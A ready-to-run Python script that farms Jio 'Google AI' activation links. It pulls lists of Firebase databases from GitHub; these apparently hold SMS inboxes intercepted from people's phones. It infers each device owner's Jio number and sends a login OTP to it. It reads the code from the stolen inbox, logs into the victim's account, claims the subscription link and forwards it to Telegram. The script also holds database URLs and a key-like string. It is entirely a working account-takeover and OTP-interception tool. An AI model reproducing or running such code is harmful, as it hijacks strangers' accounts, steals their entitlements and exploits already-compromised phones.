#!/usr/bin/env python3
"""
Jio Gemini Link Farmer — FULL WORKFLOW (single file, siap pakai)
==============================================================
Workflow lengkap:
  1. DISCOVER  — tarik daftar panel Firebase terbaru dari GitHub
                 (OshekharO + forks terbaru + repo jio-gemini lain),
                 merge + dedupe → farm_panels.json
  2. SCAN      — sweep semua panel node user_sms / messages,
                 deteksi device dengan inbox masih hangat (live window)
  3. SIM MATCH — skor nomor SIM asli device dari konteks pesan
                 ("Jio number X", field phoneNumber/simInfo) + cek Jio API
  4. FARM      — satu session per nomor:
                 sendOtp → poll Firebase (filter keypath+timestamp)
                 → validateOtp → AUTH → NAVIGATE → ACTIVATE
                 → GOOGLE_AI → ekstrak redirectionURL
                 → cek entry Google → simpan
  5. FILTER    — respon Jio mengandung "already" (ALREADY_EXISTS dll)
                 → link dibuang, nomor diblokir7 hari
                 → hanya link BERSIH yang masuk fresh_links.txt

Pemakaian:
    python3 jio_gemini_farm.py                 # full auto: discover → farm
    python3 jio_gemini_farm.py --discover-only # cuma refresh daftar panel
    python3 jio_gemini_farm.py --target 5      # berhenti setelah 5 link baru
    python3 jio_gemini_farm.py --sweep 15      # interval sweep detik

Output:
    fresh_links.txt   — link aktivasi VALID (sudah lolos semua filter)
    farm_results.csv  — riwayat setiap percobaan
    farm.log          — log lengkap
"""
from __future__ import annotations

import argparse
import csv
import html
import json
import os
import random
import re
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import requests

# ==================== KONFIG ====================
BASE = Path(__file__).resolve().parent
PANELS_FILE = BASE / "farm_panels.json"
STATE_FILE = BASE / "farm_state.json"        # watermark inbox per device
FIRED_FILE = BASE / "farm_fired.json"        # {nomor: epoch blokir}
JIOCACHE = BASE / "farm_jio_cache.json"      # {nomor: bool jio-valid}
LINKS_FILE = BASE / "fresh_links.txt"
CSV_FILE = BASE / "farm_results.csv"
LOG_FILE = BASE / "farm.log"

DISCOVER_TTL = 3600 * 6       # refresh daftar panel tiap6 jam
LIVE_WINDOW_MIN = 90          # inbox masih dianggap hidup90 menit
OTP_TIMEOUT = 110             # device stale butuh ~60-90s utk forward
POLL_INTERVAL = 1.5
PACE = (5.0, 9.0)             # jeda antar kirim OTP
BACKOFF_429 = 60
LOCK_BLOCK_SEC = 1800         # nomor LOCKED → tunggu30 menit
ALREADY_BLOCK_SEC = 7 * 86400 # nomor sudah diklaim → blokir7 hari
WORKERS = 12

# Telegram (opsional — GitHub Secrets: TG_BOT_TOKEN, TG_CHAT_ID)
TG_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
TG_CHAT = os.environ.get("TG_CHAT_ID", "")

# Panel terbukti aktif (seed — hasil discover digabung di sini)
SEED_PANELS = [
    ("https://max-a-cbe29-default-rtdb.firebaseio.com", ""),
    ("https://rupesh-6c5e5-default-rtdb.firebaseio.com", "AizAsyAFML11FrkfFMx0c4hOYqaCKUNVj5f8XhA"),
    ("https://sallu-9934f-default-rtdb.firebaseio.com", ""),
    ("https://hdhdusgsvshshshs-default-rtdb.firebaseio.com", ""),
    ("https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://siwanikumar923420-2e01f-default-rtdb.firebaseio.com", ""),
    ("https://godpanel-203f8-default-rtdb.asia-southeast1.firebasedatabase.app", ""),
    ("https://pmnr1newad-default-rtdb.firebaseio.com", ""),
    ("https://master89812-b77a6-default-rtdb.firebaseio.com", ""),
    ("https://m05960864-6140e-default-rtdb.firebaseio.com", ""),
    ("https://dhheee-b95dc-default-rtdb.firebaseio.com", ""),
]

# Sumber daftar panel GitHub (diambil saat --discover)
PANEL_SOURCES = [
    "https://raw.githubusercontent.com/OshekharO/Jio-Gemini-Activation-Scanner/main/panels.txt",
    "https://raw.githubusercontent.com/75Tushar/Jio-Gemini-Activation-Scanner/main/panels.txt",
    "https://raw.githubusercontent.com/thanhnam007/Jio-Gemini-Activation-Scanner/main/panels.txt",
    "https://raw.githubusercontent.com/auzt/Jio-Gemini-Activation-Scanner/main/panels.txt",
    "https://raw.githubusercontent.com/ReXooGen/Jio-Gemini-Activation-Scanner/main/panels.txt",
]
GITHUB_FORKS_API = ("https://api.github.com/repos/OshekharO/"
                    "Jio-Gemini-Activation-Scanner/forks?sort=newest&per_page=30")
GITHUB_SEARCH_API = ("https://api.github.com/search/repositories"
                     "?q=jio+gemini+in:name,description+pushed:>2026-09-01"
                     "&per_page=20&sort=updated")

# ==================== JIO API ====================
JIO = "https://www.jio.com/api"
SEND_OTP = f"{JIO}/jio-login-service/login/sendOtp"
VERIFY_OTP = f"{JIO}/jio-login-service/login/validateOtp"
CHECK_NUM = "{JIO}/jio-recharge-service/recharge/mobility/number/{m}"
AUTH_URL = f"{JIO}/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = f"{JIO}/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = f"{JIO}/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = f"{JIO}/jio-ott-service/ott/subscription/google-ai"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"
UA = ("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")

# ==================== PATTERN ====================
OTP_WORD = re.compile(r"(?i)\botp\b|one.time.pass|verification code")
OTP_RE = re.compile(r"(?<!\d)(\d{6})(?!\d)")
ACT_RE = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})", re.IGNORECASE)
CTX = [
    (re.compile(r"(?i)jio\s*(?:number|no[.]?|नंबर|num)\s*[:=-]?\s*(?:[+]91)?\s*([6-9]\d{9})"), 6),
    (re.compile(r"(?i)(?:your|mobile|phone)\s*(?:number|no[.]?)\s*[:=-]?\s*([6-9]\d{9})"), 4),
    (re.compile(r"(?i)नंबर\s*[:=-]?\s*([6-9]\d{9})"), 6),
    (re.compile(r"(?i)quota[^.]{0,80}([6-9]\d{9})"), 3),
]
RAW10 = re.compile(r"\b[6-9]\d{9}\b")

_lock = threading.Lock()


def log(msg: str) -> None:
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with _lock:
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(line + "\n")


def tg_notify(text: str) -> None:
    """Gửi tin nhắn Telegram; im lặng nếu thiếu token/chat_id."""
    if not (TG_TOKEN and TG_CHAT):
        return
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                      json={"chat_id": TG_CHAT, "text": text}, timeout=10)
    except Exception:
        pass


def load_json(path: Path, default: Any) -> Any:
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return default


def save_json(path: Path, data: Any) -> None:
    with _lock:
        path.write_text(json.dumps(data), encoding="utf-8")


# ==================== STEP1 — DISCOVER PANEL BARU ====================

def _gh_get(url: str, timeout: int = 15) -> Any:
    req = requests.Request("GET", url, headers={
        "User-Agent": "curl/8", "Accept": "application/vnd.github+json"})
    try:
        with requests.Session() as s:
            r = s.send(req, timeout=timeout)
            if r.status_code == 200:
                try:
                    return r.json()
                except ValueError:
                    return r.text
    except Exception:
        pass
    return None


def _parse_panel_line(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#") or "rtdb" not in line:
        return None
    parts = line.split("|", 1)
    url = parts[0].strip().rstrip("/")
    if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
        return None
    key = parts[1].strip() if len(parts) > 1 else ""
    if key.startswith("http"):
        key = ""
    return (url, key)


def discover_panels(force: bool = False) -> list[tuple[str, str]]:
    """Tarik daftar panel terbaru dari GitHub → farm_panels.json."""
    cached = load_json(PANELS_FILE, None)
    if (not force and isinstance(cached, dict)
            and time.time() - cached.get("ts", 0) < DISCOVER_TTL
            and len(cached.get("panels", [])) > 50):
        return [tuple(p) for p in cached["panels"]]

    merged: dict[str, str] = {}

    def add(url: str, key: str) -> None:
        if url not in merged or (not merged[url] and key):
            merged[url] = key

    for url, key in SEED_PANELS:
        add(url, key)

    #1) file panels.txt statis
    for src in PANEL_SOURCES:
        body = _gh_get(src)
        if isinstance(body, str):
            for line in body.splitlines():
                p = _parse_panel_line(line)
                if p:
                    add(*p)

    #2) fork terbaru (panel sering diupdate di fork)
    forks = _gh_get(GITHUB_FORKS_API)
    if isinstance(forks, list):
        for f in forks:
            if not isinstance(f, dict):
                continue
            raw = (f.get("raw_url") or "").replace("/forks/", "/")  # fallback
            full = f.get("full_name", "")
            if not full:
                continue
            body = _gh_get(f"https://raw.githubusercontent.com/{full}/main/panels.txt")
            if isinstance(body, str):
                for line in body.splitlines():
                    p = _parse_panel_line(line)
                    if p:
                        add(*p)

    #3) repo jio-gemini yang baru di-push
    repos = _gh_get(GITHUB_SEARCH_API)
    if isinstance(repos, dict):
        for it in repos.get("items", []):
            full = it.get("full_name", "")
            if not full:
                continue
            body = _gh_get(f"https://raw.githubusercontent.com/{full}/main/panels.txt")
            if isinstance(body, str):
                for line in body.splitlines():
                    p = _parse_panel_line(line)
                    if p:
                        add(*p)

    panels = [list(p) for p in merged.values()]
    save_json(PANELS_FILE, {"ts": time.time(), "panels": panels})
    log(f"DISCOVER: {len(panels)} panel unik dari {len(PANEL_SOURCES)} sumber + forks + search")
    return [tuple(p) for p in panels]


# ==================== STEP2 — SCAN INBOX HANGAT ====================

def fb_get(url: str, key: str, path: str, params: dict | None = None,
           timeout: int = 8) -> Any:
    q = dict(params or {})
    if key and not key.startswith("http"):
        q["auth"] = key
    try:
        r = requests.get(f"{url}/{path.lstrip('/')}.json", params=q, timeout=timeout)
        r.raise_for_status()
        return r.json()
    except Exception:
        return None


def flatten(msgs: Any):
    """Yield (keypath, msg_dict) — mendukung nested {dev:{msg:{...}}} dan flat."""
    if not isinstance(msgs, dict):
        return
    for k, v in msgs.items():
        if not isinstance(v, dict):
            continue
        if any(f in v for f in ("message", "body", "phoneNumber", "messageText", "text")):
            yield k, v
        else:
            for k2, v2 in v.items():
                if isinstance(v2, dict):
                    yield f"{k}/{k2}", v2


def msg_ts(keypath: str, md: dict) -> float:
    for f in ("timestamp", "time", "date", "ts"):
        v = md.get(f)
        if v is not None:
            try:
                return float(v)
            except Exception:
                pass
    for seg in reversed(keypath.split("/")):
        if seg.isdigit() and len(seg) >= 10:
            return float(seg)
    return 0.0


def norm_num(v: Any) -> str | None:
    d = re.sub(r"\D", "", str(v or ""))
    if len(d) == 12 and d.startswith("91"):
        d = d[2:]
    elif len(d) > 12:
        d = d[-10:]
    return d if re.fullmatch(r"[6-9]\d{9}", d) else None


def scan_live(panels: list[tuple[str, str]], state: dict) -> list[dict]:
    """Kirim semua panel paralel → device dengan inbox < LIVE_WINDOW_MIN."""
    cutoff = time.time() * 1000 - LIVE_WINDOW_MIN * 60_000
    hits: list[dict] = []

    def one(pk: tuple[str, str]) -> list[dict]:
        url, key = pk
        out = []
        for node in ("user_sms", "messages"):
            devs = fb_get(url, key, node, {"shallow": "true"})
            if not isinstance(devs, dict):
                continue
            for dev in list(devs.keys())[:80]:
                data = fb_get(url, key, f"{node}/{dev}",
                              {"orderBy": '"$key"', "limitToLast": 15})
                newest, flat = 0.0, []
                for kp, md in flatten(data):
                    ts = msg_ts(kp, md)
                    newest = max(newest, ts)
                    flat.append((kp, md))
                if newest > cutoff:
                    out.append({"url": url, "key": key, "node": node, "dev": dev,
                                "newest": newest, "msgs": flat,
                                "fresh": newest > state.get(f"{url}|{node}|{dev}", 0)})
        return out

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        for fut in as_completed([pool.submit(one, pk) for pk in panels]):
            try:
                hits.extend(fut.result() or [])
            except Exception:
                pass
    hits.sort(key=lambda d: -d["newest"])
    return hits


def score_sim(flat: list[tuple[str, dict]]) -> list[tuple[str, int]]:
    """Skor kandidat nomor SIM milik device (context > frekuensi)."""
    scores: Counter = Counter()
    for _, md in flat:
        pn = norm_num(md.get("phoneNumber"))
        if pn:
            scores[pn] += 10
        sim = md.get("simInfo")
        if isinstance(sim, dict):
            n = norm_num(sim.get("phoneNumber"))
            if n:
                scores[n] += 8
        body = str(md.get("body") or md.get("message")
                   or md.get("messageText") or md.get("text") or "")
        for pat, w in CTX:
            for m in pat.findall(body):
                n = norm_num(m)
                if n:
                    scores[n] += w
        for m in RAW10.findall(body):
            n = norm_num(m)
            if n:
                scores[n] += 1
    return sorted(scores.items(), key=lambda x: -x[1])


def jio_valid(mob: str, cache: dict) -> bool:
    if mob in cache:
        return bool(cache[mob])
    ok = False
    for _ in range(2):
        try:
            r = requests.get(CHECK_NUM.format(JIO=JIO, m=mob), timeout=12, headers={
                "User-Agent": UA, "Accept": "application/json, */*",
                "Origin": "https://www.jio.com",
                "Referer": "https://www.jio.com/selfcare/login/"})
            ok = r.ok and isinstance(r.json(), dict) and bool(r.json().get("primaryService"))
            break
        except Exception:
            time.sleep(2)
    cache[mob] = ok
    with _lock:
        save_json(JIOCACHE, cache)
    return ok


# ==================== STEP3 — FIRE → INTERCEPT → CLAIM ====================

def make_jio() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA, "Accept": "application/json, */*",
        "Accept-Language": "en-IN,en;q=0.9", "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/", "x-request-source": "wap"})
    return s


def send_otp(jio: requests.Session, mobile: str) -> tuple[bool, str]:
    """(True,'') sukses; (False,'LOCKED'/'RATE'/'INVALID'/pesan)."""
    for attempt in range(2):
        try:
            r = jio.post(SEND_OTP, json={"mobileNumber": mobile,
                                         "loginFlowType": "MOBILE",
                                         "alternateNumber": ""}, timeout=12)
            if r.status_code == 429:
                if attempt == 0:
                    log(f"  [429] backoff {BACKOFF_429}s")
                    time.sleep(BACKOFF_429)
                    continue
                return False, "RATE"
            d = r.json() if r.ok else {}
            if r.ok and d.get("responseCode") == "200":
                return True, ""
            err = str(d.get("errorMessage", r.status_code))
            if "LOCKED" in err:
                return False, "LOCKED"
            if "INVALID" in err:
                return False, "INVALID"
            return False, err[:50]
        except Exception as e:
            return False, type(e).__name__
    return False, "RATE"


def wait_otp(dev: dict, jio: requests.Session, mobile: str) -> str | None:
    """Poll inbox device; return OTP terbaru yang sampai SETELAH fire."""
    known = {kp for kp, _ in dev["msgs"]}
    deadline = time.monotonic() + OTP_TIMEOUT
    tried: set[str] = set()
    while time.monotonic() < deadline:
        data = fb_get(dev["url"], dev["key"], f"{dev['node']}/{dev['dev']}",
                      {"orderBy": '"$key"', "limitToLast": 15})
        found: list[tuple[float, str]] = []
        for kp, md in flatten(data):
            ts = msg_ts(kp, md)
            if kp in known and ts <= dev["newest"]:
                continue
            body = str(md.get("body") or md.get("message") or md.get("messageText") or "")
            if OTP_WORD.search(body):
                m = OTP_RE.search(body)
                if m and m.group(1) not in tried:
                    found.append((ts, m.group(1)))
        for _, otp in sorted(found, reverse=True):
            tried.add(otp)
            try:
                r = jio.post(VERIFY_OTP, json={"mobileNumber": mobile, "otp": otp},
                             timeout=12)
                d = r.json() if r.ok else {}
                if r.ok and "errorMessage" not in d:
                    log(f"  OTP {otp} verified ✓")
                    return otp
            except Exception:
                pass
        time.sleep(POLL_INTERVAL)
    return None


def activation_url_from(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(5):
        d = unquote(text)
        if d == text:
            break
        text = d
    m = ACT_RE.search(text)
    if not m:
        return ""
    return ("https://serviceactivation.google.com/subscription/new/"
            + m.group("token") + m.group("padding"))


def claim(jio: requests.Session) -> tuple[str, str]:
    """→ ('ok', url) | ('already', '') | ('gagal:<pesan>', '')."""
    dh = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    oh = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        ar = jio.get(AUTH_URL, headers=dh, timeout=12)
        if not ar.ok or str((ar.json() or {}).get("loginFlag", "")).lower() != "true":
            return "gagal:session", ""
        jio.get(NAVIGATE_URL, headers=dh, timeout=12)
        act = jio.get(ACTIVATE_URL, headers=oh, timeout=12)
        ad = act.json() if act.ok else {}
        msg = " ".join(str(ad.get(k) or "")
                       for k in ("errorMessage", "responseMessage", "message")).lower()
        if "already" in msg.replace("_", " "):
            return "already", ""
        ec = str(ad.get("errorCode", "200"))
        if not act.ok or ec not in ("200", "0"):
            return f"gagal:activate({ec})", ""
        g = jio.get(GOOGLE_URL, headers=oh, timeout=12)
        gd = g.json() if g.ok else {}
        msg2 = " ".join(str(gd.get(k) or "")
                        for k in ("errorMessage", "responseMessage", "message")).lower()
        if "already" in msg2.replace("_", " "):
            return "already", ""
        url = activation_url_from(str(gd.get("redirectionURL", "")))
        if not url:
            return "gagal:no_url", ""
        return "ok", url
    except Exception as e:
        return f"gagal:{type(e).__name__}", ""


def entry_ok(url: str) -> bool:
    try:
        r = requests.get(url, allow_redirects=True, timeout=12, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        return (r.status_code == 200 and "accounts.google.com" in r.url
                and "serviceactivation" in r.url)
    except Exception:
        return False


def save_link(url: str) -> int:
    with _lock:
        old = (set(LINKS_FILE.read_text("utf-8").splitlines())
               if LINKS_FILE.exists() else set())
        if url in old:
            return len(old)
        with LINKS_FILE.open("a", encoding="utf-8") as f:
            f.write(url + "\n")
        return len(old) + 1


def save_row(num: int, mobile: str, panel: str, dev: str, status: str, url: str) -> None:
    with _lock:
        exists = CSV_FILE.exists() and CSV_FILE.stat().st_size > 0
        with CSV_FILE.open("a", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=(
                "n", "mobile", "panel", "device", "status", "url", "ts"))
            if not exists:
                w.writeheader()
            w.writerow({"n": num, "mobile": mobile, "panel": panel, "device": dev,
                        "status": status, "url": url,
                        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})


def file_count() -> int:
    return (len(LINKS_FILE.read_text("utf-8").splitlines())
            if LINKS_FILE.exists() else 0)


# ==================== MAIN LOOP ====================

def farm(args: argparse.Namespace) -> int:
    start = file_count()
    goal = start + args.target
    deadline = time.monotonic() + args.max_runtime * 60
    log(f"=== FARM START — target {start} → {goal} link, runtime ≤{args.max_runtime}m ===")

    panels = discover_panels()
    state = load_json(STATE_FILE, {})
    fired = load_json(FIRED_FILE, {})
    jcache = load_json(JIOCACHE, {})
    stats = Counter()
    sweep = 0

    while file_count() < goal:
        if time.monotonic() > deadline:
            log("=== HẾT GIỜ runtime → thoát, xuất kết quả hiện có ===")
            break
        sweep += 1
        if sweep % 40 == 1 and sweep > 1:
            panels = discover_panels()   # refresh berkala
        log(f"--- sweep#{sweep} | {len(panels)} panel ---")
        try:
            live = scan_live(panels, state)
        except Exception as e:
            log(f"  scan error: {e}")
            time.sleep(args.sweep)
            continue
        log(f"  inbox hangat: {len(live)} (baru {sum(1 for d in live if d['fresh'])})")

        for dev in live:
            if file_count() >= goal:
                break
            state[f"{dev['url']}|{dev['node']}|{dev['dev']}"] = dev["newest"]
            now = time.time()
            if now - fired.get("__last__", 0) < random.uniform(*PACE):
                time.sleep(1)

            cands = []
            for mob, sc in score_sim(dev["msgs"])[:4]:
                if sc < 4:
                    break
                if fired.get(mob, 0) > now:
                    continue
                if not jio_valid(mob, jcache):
                    stats["non_jio"] += 1
                    continue
                cands.append(mob)
                if len(cands) >= 2:
                    break

            for mob in cands:
                if file_count() >= goal:
                    break
                jio = make_jio()
                ok, err = send_otp(jio, mob)
                fired["__last__"] = time.time()
                if not ok:
                    stats[f"fire_{err}"] += 1
                    if err == "LOCKED":
                        fired[mob] = time.time() + LOCK_BLOCK_SEC
                    elif err == "RATE":
                        time.sleep(BACKOFF_429 * 2)
                        break
                    save_json(FIRED_FILE, fired)
                    continue
                fired[mob] = time.time() + LOCK_BLOCK_SEC
                save_json(FIRED_FILE, fired)
                stats["fired"] += 1
                age = (time.time() * 1000 - dev["newest"]) / 60_000
                log(f"[sweep#{sweep}] FIRE {mob} → {dev['dev'][:8]} "
                    f"({dev['node']}, inbox {age:.0f}m)")

                otp = wait_otp(dev, jio, mob)
                if not otp:
                    stats["otp_timeout"] += 1
                    save_row(len(stats), mob, dev["url"], dev["dev"],
                             "otp_timeout", "")
                    log(f"  [-] otp_timeout {mob}")
                    time.sleep(random.uniform(*PACE))
                    continue
                stats["otp_ok"] += 1

                status, url = claim(jio)
                if status == "already":
                    stats["already"] += 1
                    fired[mob] = time.time() + ALREADY_BLOCK_SEC
                    save_json(FIRED_FILE, fired)
                    save_row(len(stats), mob, dev["url"], dev["dev"],
                             "already", "")
                    log(f"  [-] {mob}: sudah pernah diklaim → blokir7 hari")
                    continue
                if not url:
                    stats[status] += 1
                    save_row(len(stats), mob, dev["url"], dev["dev"], status, "")
                    log(f"  [-] claim {mob}: {status}")
                    continue
                if not entry_ok(url):
                    stats["entry_dead"] += 1
                    save_row(len(stats), mob, dev["url"], dev["dev"],
                             "entry_dead", "")
                    log(f"  [-] {mob}: entry mati di Google")
                    continue
                n = save_link(url)
                stats["links"] += 1
                save_row(len(stats), mob, dev["url"], dev["dev"], "ok", url)
                tg_notify(f"🎯 Jio Farm — activation link mới #{n}\n"
                          f"Số: {mob}\n{url}")
                log(f"🎯 [FRESH {n}/{goal}] {mob} → {url}")
                time.sleep(random.uniform(*PACE))

        save_json(STATE_FILE, state)
        log(f"  sweep#{sweep} selesai | {dict(stats)} | file={file_count()}")
        if file_count() < goal:
            time.sleep(args.sweep)

    log(f"=== SELESAI: {file_count()} link di {LINKS_FILE.name} | {dict(stats)} ===")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Jio Gemini link farmer")
    ap.add_argument("--target", type=int, default=10,
                    help="jumlah link baru yang dikejar (default10)")
    ap.add_argument("--sweep", type=int, default=20,
                    help="jeda antar sweep detik (default20)")
    ap.add_argument("--max-runtime", type=int, default=25,
                    help="batas runtime menit (default25)")
    ap.add_argument("--test-notify", action="store_true",
                    help="gửi 1 tin Telegram thử rồi thoát")
    ap.add_argument("--discover-only", action="store_true",
                    help="hanya refresh daftar panel lalu keluar")
    ap.add_argument("--discover", action="store_true",
                    help="paksa refresh daftar panel sebelum mulai")
    args = ap.parse_args()

    if args.test_notify:
        if not (TG_TOKEN and TG_CHAT):
            print("TG CHẶN: thiếu TG_BOT_TOKEN/TG_CHAT_ID trong env")
            return 1
        tg_notify("✅ Jio Farm — test Telegram OK")
        print("Đã gửi tin test → kiểm tra Telegram của bạn")
        return 0

    panels = discover_panels(force=args.discover)
    if args.discover_only:
        for u, k in panels[:20]:
            print(f"{'KEY ' if k else 'OPEN '}{u}")
        print(f"... total {len(panels)} panel → {PANELS_FILE}")
        return 0
    return farm(args)


if __name__ == "__main__":
    sys.exit(main())